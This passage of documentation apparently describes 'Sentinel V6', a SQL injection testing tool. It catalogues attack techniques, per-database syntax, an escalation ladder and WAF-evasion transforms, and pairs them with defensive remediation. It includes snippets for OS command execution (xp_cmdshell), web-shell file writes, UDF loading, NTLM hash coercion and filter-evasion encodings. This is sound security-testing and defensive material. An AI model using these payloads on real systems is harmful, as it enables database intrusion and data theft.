- **Core Mechanism**: M13 (Database File System & Operating System Bridge).
- **Syntactic Context**: Unique, engine-specific capabilities and procedural extensions.
- **Technical Breakdown**:
  - *H2 Database*: Dynamic Java code compilation via user-defined aliases:
    `CREATE ALIAS SHELL AS 'String shellexec(String cmd) throws ...'`
  - *SQLite*: Arbitrary file creation/memory abuse via `ATTACH DATABASE '/var/www/shell.php' AS pwn`.
  - *PostgreSQL*: Writing shared libraries to disk via `lo_import()` / `lo_export()` for native function execution.
  - *MySQL*: Writing custom User-Defined Functions (UDF) into `@@plugin_dir` via `SELECT ... INTO DUMPFILE`.
  - *MSSQL*: Command execution via `master..xp_cmdshell`.
- **Verification Oracle**: Capability and privilege auditing (e.g. verifying `IS_SRVROLEMEMBER('sysadmin')` or checking `secure_file_priv`) non-destructively.
- **Defensive Remediation**: Run database processes under unprivileged service accounts with read-only file systems; disable dynamic module loading.

---

### A37: Query-Compiler & AST Translation Injection
- **Core Mechanism**: M18 (Query Compiler AST).
- **Syntactic Context**: High-level query translation engines (LINQ-to-SQL, JPA Criteria API, JOOQ, Slick).
- **Technical Breakdown**: Occurs when developers construct dynamic criteria expressions or interpolations within expression trees. Compiler edge cases in translating high-level AST nodes into raw SQL strings can drop escape boundaries.
- **Verification Oracle**: AST boundary breakout testing and SQL syntax error signature mapping.
- **Defensive Remediation**: Rely exclusively on strongly-typed criteria builders; never interpolate raw strings into Criteria API expressions.

---

### A38: API Transport & Protocol Header Injection
- **Core Mechanism**: M01 (Boolean), M08 (OAST).
- **Syntactic Context**: Non-traditional injection transports: HTTP headers (`X-Forwarded-For`, `User-Agent`, `Referer`, `CF-Connecting-IP`), cookies, WebSockets, gRPC metadata, and batch APIs.
- **Technical Breakdown**: Applications frequently log client metadata into database audit tables (e.g. logging `User-Agent` or client IP for analytics) using unparameterized queries (as demonstrated in CVE-2023-34362 MOVEit Transfer).
- **Verification Oracle**: Multi-transport parameter auditing across all request headers and session cookies.
- **Defensive Remediation**: Parameterize all logging and auditing SQL queries; treat HTTP headers as untrusted input.

---

### A39: Automated Schema & Metadata Discovery
- **Core Mechanism**: M03 (UNION), M01 (Boolean), M02 (Error).
- **Syntactic Context**: System catalog and metadata introspection.
- **Technical Breakdown**: Once injection is confirmed, attackers systematically map database schemas:
  - *Catalogs*: `information_schema.schemata`, `pg_database`, `sys.databases`.
  - *Tables*: `information_schema.tables`, `sys.tables`, `sqlite_master`.
  - *Columns*: `information_schema.columns`, `sys.columns`.
  - *Privileges*: `mysql.user`, `sys.database_principals`, `pg_roles`.
- **Verification Oracle**: Structural table and column extraction via logarithmic binary bisection ($O(\log_2 |\Sigma|)$) or direct UNION reflection.
- **Defensive Remediation**: Restrict access to system catalog tables using database role permissions.

---

### A40: Application-State & Asynchronous Lifecycle Flows
- **Core Mechanism**: M07 (Second-Order), M05 (Stacked).
- **Syntactic Context**: Multi-step state machine transitions, event sourcing systems, and microservice messaging buses (Kafka, RabbitMQ).
- **Technical Breakdown**: Injection payloads travel across multiple decoupled microservices before reaching a database sink. For example, a payload submitted to an order-intake service is serialized into an event bus, ingested by a fulfillment service, and finally executed in a warehouse database query hours later.
- **Verification Oracle**: Asynchronous correlation tokens and OAST collaborator tracking.
- **Defensive Remediation**: Enforce schema validation and parameterization at every microservice boundary; treat internal message queues as untrusted input sources.

---

## 4. The 14 Supported DBMS Dialects Reference

Sentinel V6 maintains native dialect compilers, error signatures, comment styles, and latency primitives for 14 database engines:

| DBMS Engine | Single Quote Escape | Comment Syntax | String Concat | Version Query | Time Latency Primitive |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **PostgreSQL** | `''` | `-- `, `/*...*/` | `\|\|` | `version()` | `pg_sleep(5)` |
| **MySQL** | `''`, `\'` | `-- `, `#`, `/*!...*/` | `CONCAT(a,b)` | `@@version` | `SLEEP(5)` |
| **MariaDB** | `''`, `\'` | `-- `, `#`, `/*!...*/` | `CONCAT(a,b)` | `VERSION()` | `SLEEP(5)` |
| **MSSQL** | `''` | `-- `, `/*...*/` | `+` | `@@VERSION` | `WAITFOR DELAY '0:0:5'` |
| **Oracle** | `''` | `-- `, `/*...*/` | `\|\|` | `banner FROM v$version` | `dbms_pipe.receive_message('a',5)` |
| **SQLite** | `''` | `-- `, `/*...*/` | `\|\|` | `sqlite_version()` | Heavy `HEX(RANDOMBLOB())` computation |
| **IBM Db2** | `''` | `-- `, `/*...*/` | `CONCAT(a,b)` | `versionnumber FROM sysibmadm.env_sys_info` | Heavy join or external routine |
| **H2** | `''` | `-- `, `//`, `/*...*/` | `\|\|` | `H2VERSION()` | Dynamic Java alias wait |
| **MS Access** | `''` | N/A (single query) | `&`, `+` | N/A | Heavy calculation or connection delay |
| **Snowflake** | `''` | `-- `, `//`, `/*...*/` | `\|\|` | `CURRENT_VERSION()` | `SYSTEM$WAIT(5)` |
| **BigQuery** | `''`, `\'` | `-- `, `#`, `/*...*/` | `CONCAT(a,b)` | N/A (Standard SQL) | `UNNEST(GENERATE_ARRAY(1, 4000000))` |
| **ClickHouse** | `''`, `\'` | `-- `, `/*...*/` | `concat(a,b)` | `version()` | `sleep(5)` |
| **CockroachDB**| `''` | `-- `, `/*...*/` | `\|\|` | `version()` | `pg_sleep(5)` |
| **TiDB / NewSQL**| `''`, `\'` | `-- `, `#`, `/*...*/` | `CONCAT(a,b)` | `tidb_version()` | `SLEEP(5)` |

---

## 5. Escalation Depth Ladder: G1 – G19

Sentinel organizes its attack escalation depth from safe non-destructive probes to comprehensive capability audits:

```
[G1 - G2]  Syntax Break & Boolean Tautology (', ", \, OR 1=1, AND 1=2)
     │
[G3 - G4]  Time-Based SPRT Latency & Error-Based Subquery Leaks
     │
[G5 - G6]  Algebraic Dialect Fingerprinting & Unicode Collation Collisions
     │
[G7 - G8]  Stacked Multi-Statement Execution & SMB NetNTLMv2 Hash Coercion
     │
[G9 - G11] Schema, Table, and Column Catalog Enumeration
     │
[G12]      Logarithmic Binary Bisection Character Extraction (O(log2 |Σ|))
     │
[G13 - G16]Privilege Auditing, File Read/Write Capabilities, and OS Command Checks
     │
[G17 - G19]Cloud DBaaS SSRF, Cloud Warehouse Probes, and Modern ORM/AST Boundaries
```

- **Level 1 (G1)**: Single quote, double quote, backslash boundary tests.
- **Level 2 (G2)**: Numeric and string boolean tautologies (`OR 1=1`, `' OR '1'='1`).
- **Level 3 (G3)**: Low-overhead conditional timers for statistical latency probing.
- **Level 4 (G4)**: Error-based extraction via type coercion (`CAST`, `CONVERT`, `ExtractValue`).
- **Level 5 (G5)**: Single-probe algebraic fingerprinting polyglots.
- **Level 6 (G6)**: Collation expansion (German `ß` → `ss`) and truncation collisions.
- **Level 7 (G7)**: Multi-statement statement delimiter chaining (`;`).
- **Level 8 (G8)**: SMB NetNTLMv2 coercion via `master..xp_dirtree` UNC paths.
- **Level 9 (G9)**: Database and catalog enumeration (`information_schema.schemata`).
- **Level 10 (G10)**: Table schema discovery via `GROUP_CONCAT` / `STRING_AGG`.
- **Level 11 (G11)**: Column discovery for sensitive data entities.
- **Level 12 (G12)**: Binary search character-by-character blind extraction ($O(\log_2 |\Sigma|)$).
- **Level 13 (G13)**: DBA role auditing (`IS_SRVROLEMEMBER('sysadmin')`, `Super_priv`).
- **Level 14 (G14)**: Server filesystem read capability audits (`LOAD_FILE`, `pg_read_file`).
- **Level 15 (G15)**: Server filesystem write capability checks (`general_log`).
- **Level 16 (G16)**: OS command execution capability verification (`xp_cmdshell`).
- **Level 17 (G17)**: Cloud DBaaS metadata endpoint probing (`pg_net`, `UTL_HTTP`).
- **Level 18 (G18)**: Cloud Data Warehouse timing & Cartesian unnesting (`SYSTEM$WAIT`, BigQuery array delay).
- **Level 19 (G19)**: Modern ORM and GraphQL AST boundary escapes (Hibernate HQL, Prisma raw strings).

---

## 6. WAF Evasion Transforms: E1 – E30

To ensure robustness against Web Application Firewalls (Cloudflare, AWS WAF, ModSecurity, Imperva), Sentinel applies 30 deterministic mutation transforms:

- **E1–E6 (Whitespace & Comment Obfuscation)**:
  - `E1`: Inline C-style comments (`SELECT/**/id/**/FROM/**/users`).
  - `E2`: MySQL versioned execution comments (`/*!50000SELECT*/`).
  - `E3`: Horizontal Tab whitespace substitution (`%09`).
  - `E4`: Line Feed whitespace substitution (`%0a`).
  - `E5`: Carriage Return / Line Feed separation (`%0d%0a`).
  - `E6`: Spaceless parenthesis wrapping (`SELECT(id)FROM(users)WHERE(1=1)`).
- **E7–E15 (Encoding Smuggling)**:
  - `E7`: Random case mutation (`uNiOn SeLeCt`).
  - `E8`: Double URL encoding (`%2527`).
  - `E9`: Fullwidth Unicode representation (`%uff07`).
  - `E10`: Hexadecimal string literal synthesis (`0x61646d696e`).
  - `E11`: GBK multi-byte backslash eating (`%bf%27`, `%df%27`).
  - `E12`: UTF-8 overlong byte sequence (`%c0%27`).
  - `E13`: HTML numeric entity encoding (`&#x27;`).
  - `E14`: Base64 wrapped statement execution.
  - `E15`: Char concatenation synthesis (`CHR(97)||CHR(100)||CHR(109)...`).
- **E16–E20 (AST Logical Equivalences)**:
  - `E16`: Equality operator replacement via `BETWEEN ... AND ...`.
  - `E17`: Equality operator replacement via `LIKE`.
  - `E18`: Arithmetic balancing (`4924 = 4875 + 49`).
  - `E19`: Scalar functions `GREATEST()` and `LEAST()`.
  - `E20`: Null-safe comparison operators (`<=>`).
- **E21–E30 (Structural & Protocol Splitting)**:
  - `E21`: Bitwise operators (`& 1`, `| 0`).
  - `E22`: Double negation logic (`NOT(NOT(1=1))`).
  - `E23`: Keyword comment fracturing (`UN/**/ION`).
  - `E24`: JSON backslash escaping (`\"`).
  - `E25`: XML CDATA encapsulation (`<![CDATA[' OR 1=1--]]>`).
  - `E26`: Parameter pollution across duplicate keys (`id=1&id=' OR 1=1--`).
  - `E27`: Multi-part chunk boundary splitting.
  - `E28`: HTTP/2 pseudo-header smuggling.
  - `E29`: Chunked Transfer-Encoding extension smuggling.
  - `E30`: Content-Type mismatch smuggling (sending JSON as `text/plain`).

---

## 7. Universal Defensive Architecture

Securing modern database applications against the entire A01–A40 attack surface requires a defense-in-depth engineering strategy:

```
[Edge Layer]       Canonicalize -> Single Decode -> WAF Inspection (E1 - E30)
      │
[API / Gateway]    Strict Type Parsing (int, UUID) -> Allowlist Identifiers (A04, A10)
      │
[Application]      Parameterized Queries / PreparedStatements (A01, A02, A09, A15)
      │            Tagged Template Literals (Prisma $queryRaw, jOOQ) (A19)
      │
[Database Kernel]  Row-Level Security (RLS) (A25) -> Principle of Least Privilege
      │            Disable Verbose Errors (A28) -> Restrict Egress Networking (A30, A32)
```

1. **Mandatory Parameterization (100% Prepared Statements)**:
   All SQL data values must be passed through parameterized bindings (`?`, `$1`, `:named`). Never concatenate user strings, cookies, or headers into SQL queries.
2. **Strict Identifier Allowlisting**:
   Because SQL identifiers (table names, column names, `ORDER BY` directions) cannot be parameterized, they must be validated against a hard-coded internal allowlist dictionary before query construction.
3. **Strongly-Typed ORM Query Builders**:
   Avoid raw escape hatches (`$queryRawUnsafe`, `sequelize.literal`, `whereRaw`). Use tagged template literals (`$queryRaw`\`...\``) where the compiler enforces parameterization.
4. **Database-Level Least Privilege**:
   - Web applications must connect using database accounts with the minimum necessary privileges (`SELECT`, `INSERT`, `UPDATE` on specific tables).
   - Revoke access to administrative procedures (`xp_cmdshell`, `lo_export`, `pg_execute_server_program`, `UTL_HTTP`).
   - Run the database service under an isolated, unprivileged operating system user with a read-only root filesystem.
5. **Database Firewall & Egress Filtering**:
   Block outbound network connections from the database cluster to external hosts on ports 53 (DNS), 80/443 (HTTP), and 445 (SMB) to eliminate Out-of-Band (OAST) and SSRF exfiltration vectors.
6. **Row-Level Security (RLS) for Multi-Tenancy**:
   Enforce multi-tenant boundaries at the database engine level (e.g. PostgreSQL RLS) tied to authenticated session variables, rather than relying exclusively on application-level filtering predicates.

---

## 8. The 8 Advanced Architectural Pillars of Sentinel V6

Beyond classical injection syntax, Sentinel V6 implements eight deep architectural pillars addressing the entire lifecycle of SQL query generation, driver transmission, parser differential analysis, and multi-signal detection:

```
+=======================================================================================================+
|                                  THE 8 ARCHITECTURAL PILLARS OF SENTINEL V6                           |
+=======================================================================================================+
| 1. 30 DBMS Dialects & Distributed Engines  | 5. 15-Dimension Parameter Typing Matrix                  |
| 2. Deep Engine Extensions & Native UDFs    | 6. Complete SQL Statement Family Coverage (13 Families)  |
| 3. Protocol & Driver Layer Dynamics        | 7. Extended SQL Object Discovery Matrix (15 Objects)     |
| 4. Multi-Tier Parser Differential Pipeline | 8. Multi-Signal Detection Robustness & Scoring            |
+=======================================================================================================+
```

### Pillar 1: 30 Supported DBMS Dialects & Distributed Engine Matrix
Sentinel scales dialect generation from classical RDBMS to cloud data warehouses, serverless query engines, and distributed NewSQL databases:

1. **Classical Relational**: PostgreSQL, MySQL, MariaDB, Microsoft SQL Server, Oracle Database, SQLite, IBM Db2, H2 Database, Microsoft Access, Firebird.
2. **Distributed NewSQL & Scale-Out**: CockroachDB, TiDB, YugabyteDB, Vitess, SingleStore, Apache Doris.
3. **Cloud Data Warehouses & MPP**: Snowflake, Google BigQuery, ClickHouse, Amazon Redshift, Azure Synapse, Databricks SQL, Vertica, Teradata.
4. **Federated Query & Lakehouse Engines**: Trino, Presto, DuckDB, SAP HANA, TimescaleDB, AlloyDB.
5. **Generic / Polyglot**: ANSI SQL-92/99/2016 Generic Adapter.

---

### Pillar 2: Database Engine Extension & Native Procedural Architecture
A deep capability audit layer verifying the operational security of server-side extensions:
- **PostgreSQL**: Probing untrusted extensions (`pg_net`, `dblink`, `pg_cron`, `pgvector`, `lo_export`, `adminpack`).
- **MySQL / MariaDB**: Auditing `@@plugin_dir` writable permissions, User-Defined Functions (`CREATE FUNCTION ... SONAME`), and `sys_exec` execution paths.
- **Oracle Database**: Evaluating built-in package execution rights (`UTL_HTTP`, `UTL_INADDR`, `UTL_FILE`, `DBMS_PIPE`, `DBMS_JAVA`).
- **Microsoft SQL Server**: Auditing extended stored procedure statuses (`xp_cmdshell`, `xp_dirtree`, `sp_OACreate`, `OPENROWSET BULK`).
- **SQLite**: Testing run-time extension loading (`load_extension()`) and auxiliary database attachments (`ATTACH DATABASE`).
- **H2 Database**: Auditing dynamic Java user-defined aliases (`CREATE ALIAS`) and script execution (`RUNSCRIPT`).
- **IBM Db2**: Auditing external routine execution and administrative commands (`SYSPROC.ADMIN_CMD`).
- **Snowflake**: Auditing external stage exfiltration permissions (`COPY INTO 's3://...'`) and stored procedure execution contexts.
- **Google BigQuery**: Auditing remote Cloud Functions connections and CPU Cartesian array unnesting boundaries.
- **ClickHouse**: Auditing native filesystem, table functions (`file()`, `url()`, `cluster()`), and vectorized exception handlers (`throwIf()`).

---

### Pillar 3: Protocol & Driver Layer Dynamics
SQL injection risks emerge not only at the database server but across the client driver and network protocol layer:
- **Wire Protocols**: Auditing PostgreSQL v3.0 protocol differences (Simple Query protocol vs Extended Query protocol: `Parse` $\to$ `Bind` $\to$ `Execute` $\to$ `Sync`), and MySQL text protocol vs `COM_STMT_PREPARE` binary protocol.
- **Data Access Drivers**: Modeling JDBC, ODBC, and ADO.NET abstraction layers, batch execution modes, and escaping quirks.
- **Connection String Injection**: Auditing unescaped parameter injection into connection strings (`trustServerCertificate=true`, `allowMultiQueries=true`, `ApplicationIntent=ReadOnly`).
- **Prepared Statement Boundary Flaws**: Differentiating between native server-side prepared statements and client-side emulated prepares (e.g., PHP PDO `PDO::ATTR_EMULATE_PREPARES = true`).
- **Type Inference Flaws**: Driver-side type guessing where string payloads bypass integer validation during implicit driver coercion.
- **Connection Pool State Contamination**: Modeling session variable persistence across pooled connections (`SET ROLE`, `SET sql_mode`, `SET search_path`).

---

### Pillar 4: Multi-Tier Parser Differential Testing Pipeline
Modern web stacks consist of multiple layers that parse the exact same HTTP input independently. Sentinel systematically evaluates divergence across the transit pipeline:

$$\text{Application Parser} \;\neq\; \text{WAF Engine} \;\neq\; \text{Reverse Proxy / CDN} \;\neq\; \text{Database Driver} \;\neq\; \text{Database Kernel Parser}$$

- **Tokenization Discrepancies**: Testing how WAFs and database parsers treat unconventional comment syntaxes (`/*!50000SELECT*/`, `UN/**/ION`, `--\r\n`).
- **Whitespace Equivalence Divergence**: Testing how proxies and SQL engines process control bytes (`%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`).
- **Quotation Handling**: Backslash escape confusion where middleware strips backslashes while the database parser interprets them as escapes (`\'`).

---

### Pillar 5: The 15-Dimension Parameter Typing Matrix
Sentinel categorizes and audits inputs across 15 distinct data types, tracing how types morph through the 4-stage type transit pipeline:

$$\text{Declared Schema Type} \;\longrightarrow\; \text{Application Controller Type} \;\longrightarrow\; \text{Driver Type} \;\longrightarrow\; \text{Database Engine Type}$$

1. **String**: Quoted literals, multi-byte encodings, collation boundaries.
2. **Integer**: Unquoted numbers, arithmetic expressions, bitwise operators.
3. **Decimal / Float**: Scientific notation (`1e0`), division-by-zero, precision truncations.
4. **Boolean**: True/False literals, bit coercion (`1`/`0`), three-valued logic (`NULL`).
5. **Date**: Formatted strings (`YYYY-MM-DD`), date math (`NOW() - INTERVAL '1 DAY'`).
6. **Timestamp**: High-precision temporal strings and timezone conversions.
7. **UUID**: Hexadecimal UUID formatting, type-cast errors.
8. **Binary**: Hex strings (`0x414243`), raw BLOBs, Base64 encodings.
9. **Array**: Postgres array constructors (`ARRAY[...]`, `ANY()`), BigQuery `GENERATE_ARRAY`.
10. **JSON**: JSON extraction operators (`->`, `->>`), JSON path syntax.
11. **XML**: XPath queries, entity references, `XMLTYPE` errors.
12. **Spatial / Geometric**: WKT strings (`POINT(0 0)`), GIS function boundaries.
13. **Vector**: Similarity operators (`<->`, `<=>`), embedding dimension arrays.
14. **Enum**: Custom database enumerations, invalid label coercion.
15. **NULL**: Three-valued logic comparisons (`IS NULL`, `NULL = NULL` $\to$ Unknown).

---

### Pillar 6: Complete SQL Statement Family Coverage Matrix
Formal coverage across 13 major SQL statement families:

| Statement Family | Coverage Status | Vulnerability Vector & Injection Context |
| :--- | :--- | :--- |
| **SELECT** | Fully Operational | Projected columns, WHERE filters, GROUP BY, HAVING, ORDER BY, LIMIT |
| **INSERT** | Fully Operational | VALUES list column misalignment, subquery injection, trigger activations |
| **UPDATE** | Fully Operational | SET column assignments, WHERE clause stripping, mass modification |
| **DELETE** | Fully Operational | Unconstrained WHERE clause manipulation, mass record truncation |
| **MERGE** | Fully Operational | ON match predicates, WHEN MATCHED / WHEN NOT MATCHED branch manipulation |
| **UPSERT** | Fully Operational | ON CONFLICT (col) DO UPDATE SET ... target assignment breakouts |
| **CALL** | Fully Operational | Stored procedure arguments, dynamic nested SQL execution |
| **EXEC / EXECUTE** | Fully Operational | Dynamic execution boundaries (`sp_executesql`, `EXECUTE IMMEDIATE`) |
| **DDL** | Fully Operational | Non-destructive schema audits, temporary table creation, index manipulation |
| **TRANSACTION** | Fully Operational | Commit / rollback manipulation, isolation boundary changes |
| **EXPLAIN** | Fully Operational | Query plan cost differential probing (`EXPLAIN ANALYZE`) |
| **PREPARE** | Fully Operational | Dynamic statement compilation (`PREPARE stmt FROM ...; EXECUTE stmt`) |
| **COPY / BULK** | Fully Operational | Bulk import/export operations (`COPY TO/FROM`, `BULK INSERT`) |

---

### Pillar 7: Extended SQL Object Discovery Matrix
Comprehensive schema and catalog introspection targeting 15 database object types:
1. **Tables**: `information_schema.tables`, `sys.tables`, `sqlite_master`.
2. **Columns**: `information_schema.columns`, `sys.columns`.
3. **Views**: `information_schema.views`, `pg_views`.
4. **Materialized Views**: `pg_matviews`, ClickHouse materialized engine definitions.
5. **Sequences**: `information_schema.sequences`, `pg_sequences`.
6. **Indexes**: `pg_indexes`, `sys.indexes`, `SHOW INDEX`.
7. **Constraints**: `information_schema.table_constraints`, `referential_constraints`.
8. **Triggers**: `information_schema.triggers`, `sys.triggers`.
9. **Stored Procedures**: `information_schema.routines WHERE routine_type='PROCEDURE'`.
10. **Stored Functions**: `information_schema.routines WHERE routine_type='FUNCTION'`.
11. **Packages**: Oracle `ALL_SOURCE`, `USER_SOURCE`.
12. **Extensions / Modules**: `pg_extension`, MySQL `mysql.func`.
13. **Roles & Accounts**: `pg_roles`, `mysql.user`, `sys.database_principals`.
14. **Privileges & Grants**: `information_schema.role_table_grants`, `sys.database_permissions`.
15. **Foreign Data Wrappers & Links**: PostgreSQL `pg_foreign_server`, `pg_foreign_table`, MSSQL `sys.servers`.

---

### Pillar 8: Multi-Signal Detection Robustness & Anomaly Scoring
To maintain 0% false positive rates in high-noise, distributed enterprise production environments, Sentinel aggregates 11 distinct observational signals:
1. **Response-Length Differential**: Normalized byte-length variance scoring between $H_0$ (baseline) and $H_1$ (probe).
2. **Compression-Length Differential**: Measuring entropy deltas in gzip/brotli compressed payloads.
3. **Cache Behavior Discrimination**: Detecting cache-hit headers (`X-Cache: HIT`, `CF-Cache-Status: HIT`) to invalidate cached false positives.
4. **Connection Behavior Monitoring**: Tracking connection resets, keep-alive termination, and HTTP/2 stream multiplexing anomalies.
5. **Query-Plan Cost Divergence**: Using computational complexity timing to distinguish indexed versus unindexed execution paths.
6. **Resource-Consumption Probing**: Measuring server CPU burn through non-destructive arithmetic loops.
7. **Multi-Channel Combined Scoring**: Weighted consensus across HTTP status codes, DOM diffs, header mutations, and content bodies.
8. **Retry Consistency Validation**: Verifying that positive anomalies reproduce deterministically across 3 sequential clean-room executions.
9. **Baseline Drift Compensation**: Dynamic baseline recalibration adapting to fluctuating live production traffic.
10. **Rate-Limit & WAF Block Detection**: Immediate detection of 429 Too Many Requests and WAF block pages (`403 Forbidden` with challenge captcha).
11. **CDN / Edge Proxy Desynchronization**: Isolating edge caching artifacts from origin server database executions.

